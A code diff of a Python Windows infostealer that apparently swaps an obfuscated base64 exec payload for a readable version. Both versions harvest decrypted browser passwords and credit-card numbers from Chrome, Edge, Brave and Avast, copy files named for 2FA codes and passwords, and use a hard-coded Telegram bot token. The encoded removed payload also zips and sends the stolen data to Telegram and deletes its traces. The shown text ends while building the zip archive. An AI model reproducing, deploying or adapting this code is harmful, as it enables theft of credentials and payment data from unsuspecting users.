@@ -1,34 +1,277 @@
-import os, random, time, sqlite3, shutil, requests
-import zipfile, json, psutil, base64, getpass
-import subprocess, xml.etree.ElementTree as ET
-import winreg as reg, threading, asyncio, ctypes
+try:
+    import os, time, sys, json, base64, sqlite3, shutil
+    import xml.etree.ElementTree as ET
+    import winreg as reg, asyncio, ctypes
+    from datetime import datetime, timedelta
+    from pathlib import Path
+    from urllib.request import urlopen, Request
+    from json import loads as json_loads
+    from Crypto.Cipher import AES
+    from ctypes import wintypes
+    from bs4 import BeautifulSoup
+    from colorama import Fore, Style
+    from pystyle import Write, System, Colors, Colorate
+    import tkinter as tk
+    from tkinter import filedialog
+    from playwright.sync_api import Playwright, sync_playwright
+    import psutil
+    import shutil
+    from telebot import TeleBot, types
 
-from Crypto.Cipher import AES
-from ctypes import wintypes
-from ctypes.wintypes import BOOL, DWORD, LPVOID, LPCWSTR
-from urllib.request import urlopen, Request
-from json import loads as json_loads, load
-from datetime import datetime
-from datetime import datetime, timedelta
-from json import loads
-from pathlib import Path
-from telebot import TeleBot, types
+except ModuleNotFoundError:
+    os.system("pip install requests")
+    os.system("pip install pycryptodome")   
+    os.system("pip install beautifulsoup4")
+    os.system("pip install colorama")
+    os.system("pip install pystyle")
+    os.system("pip install playwright")
+    os.system("pip install psutil")
+    os.system("pip install pytelegrambotapi")
 
-i = '''
-╔═══════════════════════════════════════════════╗
+user = os.path.expanduser("~")
+username = os.getenv("USERNAME")
+user_name = os.getlogin()
 
-   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
-   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
-   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
-   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
-   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
-   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
-   
-╚═══════════════════════════════════════════════╝
-'''
+BOT_TOKEN = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
+USER_TLG_ID = 1972505293
 
-r = '''
-════════════ 𝐕𝐒𝐗𝐗 - 𝐁𝐘: @𝐑𝟎𝐁𝐌𝟎 ════════════
-'''
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+u_folder = os.path.join(os.path.expanduser("~"), "Google")
 
-exec(base64.b64decode('dXNlciA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCnVzZXJuYW1lID0gb3MuZ2V0ZW52KCJVU0VSTkFNRSIpCnVzZXJfbmFtZSA9IG9zLmdldGxvZ2luKCkKCkJPVF9UT0tFTiA9ICI2NjUwNTA1MjQyOkFBRzVwMWRLZ0V0V1JHOHVMT2pPbnptYmc4aTZDRDBOTG9VIgpDSEFUX0lEID0gLTEwMDE5MzMxMDI3ODAKVVNFUl9UTEdfSUQgPSAxOTcyNTA1MjkzCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnVfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiR29vZ2xlIikKCmFycm93ID0gIiDinqQgIgpzID0gIlxuIgoKZGVmIGNyZWF0ZV9mb2xkZXIoZm9sZGVyX3BhdGgpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZvbGRlcl9wYXRoKToKICAgICAgICBvcy5tYWtlZGlycyhmb2xkZXJfcGF0aCwgZXhpc3Rfb2s9VHJ1ZSkKCmNyZWF0ZV9mb2xkZXIodV9mb2xkZXIpCgpkZWYgc2hvd19maWxlcygpOgogICAgdHJ5OgogICAgICAgIHJlZ2lzdHJ5X3BhdGggPSByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXEFkdmFuY2VkIgogICAgICAgIGtleV9uYW1lID0gIkhpZGRlbiIKCiAgICAgICAgd2l0aCByZWcuT3BlbktleShyZWcuSEtFWV9DVVJSRU5UX1VTRVIsIHJlZ2lzdHJ5X3BhdGgsIDAsIHJlZy5LRVlfU0VUX1ZBTFVFKSBhcyBrZXk6CiAgICAgICAgICAgIHJlZy5TZXRWYWx1ZUV4KGtleSwga2V5X25hbWUsIDAsIHJlZy5SRUdfRFdPUkQsIDEpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgIApzaG93X2ZpbGVzKCkKCmZvbGRlcnMgPSBbICAgIAogICAgb3MucGF0aC5qb2luKHVzZXIsICJEb3dubG9hZHMiKSwgCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIk9uZURyaXZlIiwgIkRvY3VtZW50cyIpLAogICAgb3MucGF0aC5qb2luKHVzZXIsICJEb2N1bWVudHMiKSwgCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIk9uZURyaXZlIiwgIkRvY3VtZW50b3MiKSwKICAgIG9zLnBhdGguam9pbih1c2VyLCAiRG9jdW1lbnRvcyIpLCAKICAgIG9zLnBhdGguam9pbih1c2VyLCAiT25lRHJpdmUiLCAiRXNjcml0b3JpbyIpLAogICAgb3MucGF0aC5qb2luKHVzZXIsICJPbmVEcml2ZSIsICJEZXNrdG9wIiksCiAgICBvcy5wYXRoLmpvaW4odXNlciwgIkRlc2t0b3AiKSwKICAgIG9zLnBhdGguam9pbih1c2VyLCAiRXNjcml0b3JpbyIpLApdCgpmaWxlX3NlYXJjaCA9IHsiMmZhIiwgImJhY2t1cCIsICJ0d28iLCAiZmFjdG9yIiwgImNvZGVzIiwgImNvZGUiLCAicGFzc3dvcmRzIn0KZXh0ZW5zaW9ucyA9ICgnLmRvY3gnLCAnLnhsc3gnLCAnLnBwdHgnLCAnLnBkZicsICcuY3N2JykKCmRlZiBzZWFyY2hfZmlsZXMoZmlsZW5hbWUpOgogICAgZmlsZW5hbWVfbG93ZXIgPSBmaWxlbmFtZS5sb3dlcigpCiAgICByZXR1cm4gYW55KGtleXdvcmQgaW4gZmlsZW5hbWVfbG93ZXIgZm9yIGtleXdvcmQgaW4gZmlsZV9zZWFyY2gpCgpmb3IgZm9sZGVyIGluIGZvbGRlcnM6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZm9sZGVyKToKICAgICAgICBjb250aW51ZQogICAgCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhmb2xkZXIpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aCgnLnR4dCcpIGFuZCBzZWFyY2hfZmlsZXMoZmlsZSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weShmaWxlX3BhdGgsIHVfZm9sZGVyKQogICAgICAgICAgICBlbGlmIGZpbGUubG93ZXIoKS5lbmRzd2l0aChleHRlbnNpb25zKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5KGZpbGVfcGF0aCwgdV9mb2xkZXIpCgpicm93c2VycyA9IHsKICAgICdBdmFzdCc6IGxvY2FsICsgJ1xcQVZBU1RcXFNvZnR3YXJlIEJyb3dzZXJcXFVzZXIgRGF0YScsICAKICAgICdDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGEnLAogICAgJ0VkZ2UnOiBsb2NhbCArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhJywKICAgICdCcmF2ZSc6IGxvY2FsICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhJywKfQoKZGF0YV9xdWVyaWVzID0gewogICAgJ1Bhc3N3b3Jkcyc6IHsKICAgICAgICAncXVlcnknOiAnU0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucycsCiAgICAgICAgJ2ZpbGUnOiAnXFxMb2dpbiBEYXRhJywKICAgICAgICAnY29sdW1ucyc6IFsnVVJMJywgJ1VzZXInLCAnUGFzc3dvcmQnXSwKICAgICAgICAnZGVjcnlwdCc6IFRydWUKICAgIH0sCiAgICAnQ3JlZGl0IENhcmRzJzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgbmFtZV9vbl9jYXJkLCBleHBpcmF0aW9uX21vbnRoLCBleHBpcmF0aW9uX3llYXIsIGNhcmRfbnVtYmVyX2VuY3J5cHRlZCwgZGF0ZV9tb2RpZmllZCBGUk9NIGNyZWRpdF9jYXJkcycsCiAgICAgICAgJ2ZpbGUnOiAnXFxXZWIgRGF0YScsCiAgICAgICAgJ2NvbHVtbnMnOiBbJ05hbWUnLCAnTW9udGgnLCAnWWVhcicsICdDYXJkIE51bWJlciddLAogICAgICAgICdkZWNyeXB0JzogVHJ1ZQogICAgfSwKICAgICdIaXN0b3J5JzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgdXJsLCB0aXRsZSBGUk9NIHVybHMnLAogICAgICAgICdmaWxlJzogJ1xcSGlzdG9yeScsCiAgICAgICAgJ2NvbHVtbnMnOiBbJ1VSTCcsICdUaXRsZSddLAogICAgICAgICdkZWNyeXB0JzogRmFsc2UKICAgIH0sCiAgICAnRG93bmxvYWRzJzogewogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgdGFiX3VybCwgdGFyZ2V0X3BhdGggRlJPTSBkb3dubG9hZHMnLAogICAgICAgICdmaWxlJzogJ1xcSGlzdG9yeScsCiAgICAgICAgJ2NvbHVtbnMnOiBbJ1VSbCcsICdQYXRoJ10sCiAgICAgICAgJ2RlY3J5cHQnOiBGYWxzZQogICAgfSwKfQoKY3J5cHQzMiA9IGN0eXBlcy53aW5kbGwuY3J5cHQzMgoKY2xhc3MgREFUQV9CTE9CKGN0eXBlcy5TdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbKCJjYkRhdGEiLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgICAgICAgICAoInBiRGF0YSIsIGN0eXBlcy5QT0lOVEVSKGN0eXBlcy5jX2J5dGUpKV0KCmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhLmFyZ3R5cGVzID0gW2N0eXBlcy5QT0lOVEVSKERBVEFfQkxPQiksIGN0eXBlcy5QT0lOVEVSKHdpbnR5cGVzLkxQV1NUUiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN0eXBlcy5QT0lOVEVSKERBVEFfQkxPQiksIGN0eXBlcy5jX3ZvaWRfcCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfdm9pZF9wLCB3aW50eXBlcy5EV09SRCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLlBPSU5URVIoREFUQV9CTE9CKV0KY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEucmVzdHlwZSA9IHdpbnR5cGVzLkJPT0wKCmRlZiBkYXRhX3RvX2Jsb2IoZGF0YSk6CiAgICBibG9iID0gREFUQV9CTE9CKCkKICAgIGJsb2IuY2JEYXRhID0gbGVuKGRhdGEpCiAgICBibG9iLnBiRGF0YSA9IGN0eXBlcy5jYXN0KGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihkYXRhKSwgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfYnl0ZSkpCiAgICByZXR1cm4gYmxvYgoKZGVmIENyeXB0VW5wcm90ZWN0RGF0YShkYXRhLCBlbnRyb3B5LCByZXNlcnZlZCwgcHJvbXB0LCBmbGFncyk6CiAgICBpbl9kYXRhID0gZGF0YV90b19ibG9iKGRhdGEpCiAgICBvdXRfZGF0YSA9IERBVEFfQkxPQigpCiAgICBkZXNjcmlwdGlvbiA9IHdpbnR5cGVzLkxQV1NUUigpCiAgICAKICAgIHJlc3VsdCA9IGNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKAogICAgICAgIGN0eXBlcy5ieXJlZihpbl9kYXRhKSwKICAgICAgICBjdHlwZXMuYnlyZWYoZGVzY3JpcHRpb24pLAogICAgICAgIGVudHJvcHksCiAgICAgICAgcmVzZXJ2ZWQsCiAgICAgICAgcHJvbXB0LAogICAgICAgIGZsYWdzLAogICAgICAgIGN0eXBlcy5ieXJlZihvdXRfZGF0YSkKICAgICkKICAgIAogICAgaWYgbm90IHJlc3VsdDoKICAgICAgICByYWlzZSBjdHlwZXMuV2luRXJyb3IoKQogICAgCiAgICBkZWNyeXB0ZWRfZGF0YSA9IGN0eXBlcy5zdHJpbmdfYXQob3V0X2RhdGEucGJEYXRhLCBvdXRfZGF0YS5jYkRhdGEpCiAgICByZXR1cm4gZGVzY3JpcHRpb24udmFsdWUsIGRlY3J5cHRlZF9kYXRhCgpkZWYgZ2V0X21hc3Rlcl9rZXkocGF0aDogc3RyKToKICAgIHRyeToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBpZiAnb3NfY3J5cHQnIG5vdCBpbiBvcGVuKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIsICdyJywgZW5jb2Rpbmc9J3V0Zi04JykucmVhZCgpOgogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgd2l0aCBvcGVuKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgYyA9IGYucmVhZCgpCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpCgogICAgICAgIGtleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICBrZXkgPSBrZXlbNTpdCiAgICAgICAga2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKGtleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgICAgICByZXR1cm4ga2V5CiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBOb25lCgpkZWYgZGVjcnlwdF9wYXNzd29yZChidWZmOiBieXRlcywga2V5OiBieXRlcykgLT4gc3RyOgogICAgaXYgPSBidWZmWzM6MTVdCiAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikKICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKCiAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBzYXZlX3Jlc3VsdHMoYnJvd3Nlcl9uYW1lLCB0eXBlX29mX2RhdGEsIGNvbnRlbnQpOgogICAgYnJvd3NlciA9IG9zLnBhdGguam9pbih1X2ZvbGRlciwgIkJyb3dzZXJzIiwgYnJvd3Nlcl9uYW1lKQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGJyb3dzZXIpOgogICAgICAgIG9zLm1ha2VkaXJzKGJyb3dzZXIsIGV4aXN0X29rPVRydWUpCiAgICAKICAgIGlmIGNvbnRlbnQgaXMgbm90IE5vbmU6CiAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKGJyb3dzZXIsIGYie3R5cGVfb2ZfZGF0YX0udHh0IikKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAndycsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGUud3JpdGUoaS5zdHJpcCgpICsgIlxuXG4iICsgY29udGVudCkKCmRlZiBnZXRfZGF0YShwYXRoOiBzdHIsIHByb2ZpbGU6IHN0ciwga2V5LCB0eXBlX29mX2RhdGEpOgogICAgdHJ5OgogICAgICAgIGRiX2ZpbGUgPSBmJ3twYXRofVxce3Byb2ZpbGV9e3R5cGVfb2ZfZGF0YVsiZmlsZSJdfScKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZGJfZmlsZSk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIHJlc3VsdCA9ICIiCiAgICAgICAgc2h1dGlsLmNvcHkoZGJfZmlsZSwgJ3RlbXBfZGInKQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoJ3RlbXBfZGInKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICBjdXJzb3IuZXhlY3V0ZSh0eXBlX29mX2RhdGFbJ3F1ZXJ5J10pCiAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgcm93ID0gbGlzdChyb3cpCiAgICAgICAgICAgIGlmIHR5cGVfb2ZfZGF0YVsnZGVjcnlwdCddOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKHJvdykpOgogICAgICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uocm93W2ldLCBieXRlcyk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJvd1tpXSA9IGRlY3J5cHRfcGFzc3dvcmQocm93W2ldLCBrZXkpCiAgICAgICAgICAgIGlmIGRhdGFfdHlwZV9uYW1lID09ICdoaXN0b3J5JzoKICAgICAgICAgICAgICAgIGlmIHJvd1syXSAhPSAwOgogICAgICAgICAgICAgICAgICAgIHJvd1syXSA9IGNvbnZlcnRfY2hyb21lX3RpbWUocm93WzJdKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICByb3dbMl0gPSAiMCIKICAgICAgICAgICAgcmVzdWx0ICs9ICJcbiIuam9pbihbZiJ7Y29sfToge3ZhbH0iIGZvciBjb2wsIHZhbCBpbiB6aXAodHlwZV9vZl9kYXRhWydjb2x1bW5zJ10sIHJvdyldKSArICJcblxuIgogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZSgndGVtcF9kYicpCiAgICAgICAgcmV0dXJuIHJlc3VsdAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGNvbnZlcnRfY2hyb21lX3RpbWUoY2hyb21lX3RpbWUpOgogICAgcmV0dXJuIChkYXRldGltZSgxNjAxLCAxLCAxKSArIHRpbWVkZWx0YShtaWNyb3NlY29uZHM9Y2hyb21lX3RpbWUpKS5zdHJmdGltZSgnJWQvJW0vJVkgJUg6JU06JVMnKQoKZGVmIGluc3RhbGxlZF9icm93c2VycygpOgogICAgYXZhaWxhYmxlID0gW10KICAgIGZvciB4IGluIGJyb3dzZXJzLmtleXMoKToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhicm93c2Vyc1t4XSk6CiAgICAgICAgICAgIGF2YWlsYWJsZS5hcHBlbmQoeCkKICAgIHJldHVybiBhdmFpbGFibGUKCmF2YWlsYWJsZV9icm93c2VycyA9IGluc3RhbGxlZF9icm93c2VycygpCgpmb3IgYnJvd3NlciBpbiBhdmFpbGFibGVfYnJvd3NlcnM6CiAgICBicm93c2VyX3BhdGggPSBicm93c2Vyc1ticm93c2VyXQogICAgbWFzdGVyX2tleSA9IGdldF9tYXN0ZXJfa2V5KGJyb3dzZXJfcGF0aCkKCiAgICBmb3IgZGF0YV90eXBlX25hbWUsIGRhdGFfdHlwZSBpbiBkYXRhX3F1ZXJpZXMuaXRlbXMoKToKICAgICAgICBkYXRhID0gZ2V0X2RhdGEoYnJvd3Nlcl9wYXRoLCAiRGVmYXVsdCIsIG1hc3Rlcl9rZXksIGRhdGFfdHlwZSkKICAgICAgICBzYXZlX3Jlc3VsdHMoYnJvd3NlciwgZGF0YV90eXBlX25hbWUsIGRhdGEpCgphc3luYyBkZWYgY3JlYXRlX3ppcCh1X2ZvbGRlcik6CiAgICB1c2VyID0gb3MuZ2V0bG9naW4oKQoKICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpCiAgICB6aXBfZmlsZW5hbWUgPSBmIlJPQk1PW3t1c2VyfV1be25vdy5kYXk6MDJkfXtub3cubW9udGg6MDJkfXtub3cuaG91cjowMmR9e25vdy5zZWNvbmQ6MDJkfV0uemlwIgoKICAgIHppcF9maWxlcGF0aCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSwgemlwX2ZpbGVuYW1lKQoKICAgIHRyeToKICAgICAgICBzaHV0aWwubWFrZV9hcmNoaXZlKHppcF9maWxlcGF0aFs6LTRdLCAnemlwJywgdV9mb2xkZXIpCiAgICAgICAgcmV0dXJuIHppcF9maWxlcGF0aAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgICAgICByZXR1cm4gTm9uZSAgICAKICAgIAphc3luYyBkZWYgc2VuZF96aXBfdG9fdGVsZWdyYW0oemlwX2ZpbGVwYXRoLCBib3RfdG9rZW4sIGNoYXRfaWQpOgogICAgYm90ID0gVGVsZUJvdChib3RfdG9rZW4pCgogICAgdHJ5OgogICAgICAgIHVzZXJfbWVzc2FnZSA9IGYiVXNlcjoge3VzZXJfbmFtZX0iCiAgICAgICAgCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCB1c2VyX21lc3NhZ2UpCgogICAgICAgIHdpdGggb3Blbih6aXBfZmlsZXBhdGgsICdyYicpIGFzIHppcF9maWxlOgogICAgICAgICAgICBib3Quc2VuZF9kb2N1bWVudChjaGF0X2lkLCB6aXBfZmlsZSkKCiAgICAgICAgc2VwYXJhdG9yX21lc3NhZ2UgPSAi4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgc2VwYXJhdG9yX21lc3NhZ2UpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKCmFzeW5jIGRlZiBtYWluKCk6CiAgICB6aXBfZmlsZXBhdGggPSBhd2FpdCBjcmVhdGVfemlwKHVfZm9sZGVyKQogICAgaWYgemlwX2ZpbGVwYXRoOgogICAgICAgIGF3YWl0IHNlbmRfemlwX3RvX3RlbGVncmFtKHppcF9maWxlcGF0aCwgQk9UX1RPS0VOLCBDSEFUX0lEKQogICAgICAgIGF3YWl0IHNlbmRfemlwX3RvX3RlbGVncmFtKHppcF9maWxlcGF0aCwgQk9UX1RPS0VOLCBVU0VSX1RMR19JRCkKICAgICAgICBvcy5yZW1vdmUoemlwX2ZpbGVwYXRoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGFzeW5jaW8ucnVuKG1haW4oKSkKCmRlZiBkZWxldGUoKToKICAgIHRyeToKICAgICAgICBzaHV0aWwucm10cmVlKHVfZm9sZGVyKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCmRlbGV0ZSgpCgpkZWYgZGVsZXRlZmlsZSgpOgogICAgdXNlcl9mb2xkZXJfcGF0aCA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCiAgICBkZXN0aW5hdGlvbl9wYXRoID0gb3MucGF0aC5qb2luKHVzZXJfZm9sZGVyX3BhdGgsICJ0b29scy5weSIpCgogICAgaWYgb3MucGF0aC5leGlzdHMoZGVzdGluYXRpb25fcGF0aCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5yZW1vdmUoZGVzdGluYXRpb25fcGF0aCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MgIAoKZGVsZXRlZmlsZSgp').decode('utf-8'))
+def create_folder(folder_path):
+    if not os.path.exists(folder_path):
+        os.makedirs(folder_path, exist_ok=True)
+
+create_folder(u_folder)
+
+def show_files():
+    try:
+        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+        key_name = "Hidden"
+
+        with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_path, 0, reg.KEY_SET_VALUE) as key:
+            reg.SetValueEx(key, key_name, 0, reg.REG_DWORD, 1)
+
+    except Exception as e:
+        pass
+    
+show_files()
+
+browsers = {
+    'Avast': local + '\\AVAST\\Software Browser\\User Data',  
+    'Chrome': local + '\\Google\\Chrome\\User Data',
+    'Edge': local + '\\Microsoft\\Edge\\User Data',
+    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
+}
+
+data_queries = {
+    'Passwords': {
+        'query': 'SELECT origin_url, username_value, password_value FROM logins',
+        'file': '\\Login Data',
+        'columns': ['URL', 'User', 'Password'],
+        'decrypt': True
+    },
+    'Credit Cards': {
+        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+        'file': '\\Web Data',
+        'columns': ['Name', 'Month', 'Year', 'Card Number'],
+        'decrypt': True
+    },
+    'History': {
+        'query': 'SELECT url, title FROM urls',
+        'file': '\\History',
+        'columns': ['URL', 'Title'],
+        'decrypt': False
+    },
+    'Downloads': {
+        'query': 'SELECT tab_url, target_path FROM downloads',
+        'file': '\\History',
+        'columns': ['URl', 'Path'],
+        'decrypt': False
+    },
+}
+
+crypt32 = ctypes.windll.crypt32
+
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [("cbData", wintypes.DWORD),
+                ("pbData", ctypes.POINTER(ctypes.c_byte))]
+
+crypt32.CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB), ctypes.POINTER(wintypes.LPWSTR),
+                                       ctypes.POINTER(DATA_BLOB), ctypes.c_void_p,
+                                       ctypes.c_void_p, wintypes.DWORD,
+                                       ctypes.POINTER(DATA_BLOB)]
+crypt32.CryptUnprotectData.restype = wintypes.BOOL
+
+def data_to_blob(data):
+    blob = DATA_BLOB()
+    blob.cbData = len(data)
+    blob.pbData = ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte))
+    return blob
+
+def CryptUnprotectData(data, entropy, reserved, prompt, flags):
+    in_data = data_to_blob(data)
+    out_data = DATA_BLOB()
+    description = wintypes.LPWSTR()
+    
+    result = crypt32.CryptUnprotectData(
+        ctypes.byref(in_data),
+        ctypes.byref(description),
+        entropy,
+        reserved,
+        prompt,
+        flags,
+        ctypes.byref(out_data)
+    )
+    
+    if not result:
+        raise ctypes.WinError()
+    
+    decrypted_data = ctypes.string_at(out_data.pbData, out_data.cbData)
+    return description.value, decrypted_data
+
+def get_master_key(path: str):
+    try:
+        if not os.path.exists(path):
+            return
+
+        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+            return
+
+        with open(path + "\\Local State", "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = key[5:]
+        key = CryptUnprotectData(key, None, None, None, 0)[1]
+        return key
+    except Exception:
+        return None
+
+def decrypt_password(buff: bytes, key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+
+    return decrypted_pass
+
+def save_results(browser_name, type_of_data, content):
+    browser = os.path.join(u_folder, "Browsers", browser_name)
+    if not os.path.exists(browser):
+        os.makedirs(browser, exist_ok=True)
+    
+    if content is not None:
+        file_path = os.path.join(browser, f"{type_of_data}.txt")
+        with open(file_path, 'w', encoding="utf-8") as file:
+            file.write(content)
+
+def get_data(path: str, profile: str, key, type_of_data):
+    try:
+        db_file = f'{path}\\{profile}{type_of_data["file"]}'
+        if not os.path.exists(db_file):
+            return
+        result = ""
+        shutil.copy(db_file, 'temp_db')
+        conn = sqlite3.connect('temp_db')
+        cursor = conn.cursor()
+        cursor.execute(type_of_data['query'])
+        for row in cursor.fetchall():
+            row = list(row)
+            if type_of_data['decrypt']:
+                for i in range(len(row)):
+                    if isinstance(row[i], bytes):
+                        row[i] = decrypt_password(row[i], key)
+            if data_type_name == 'history':
+                if row[2] != 0:
+                    row[2] = convert_chrome_time(row[2])
+                else:
+                    row[2] = "0"
+            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+        conn.close()
+        os.remove('temp_db')
+        return result
+    except Exception:
+        return None
+
+def convert_chrome_time(chrome_time):
+    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
+
+def installed_browsers():
+    available = []
+    for x in browsers.keys():
+        if os.path.exists(browsers[x]):
+            available.append(x)
+    return available
+
+available_browsers = installed_browsers()
+
+for browser in available_browsers:
+    browser_path = browsers[browser]
+    master_key = get_master_key(browser_path)
+
+    for data_type_name, data_type in data_queries.items():
+        data = get_data(browser_path, "Default", master_key, data_type)
+        save_results(browser, data_type_name, data)
+
+async def create_zip(u_folder):
+    user = os.getlogin()
+
+    now = datetime.now()
+    zip_filename = f"[{user}][{now.day:02d}{now.month:02d}{now.hour:02d}{now.second:02d}].zip"
+
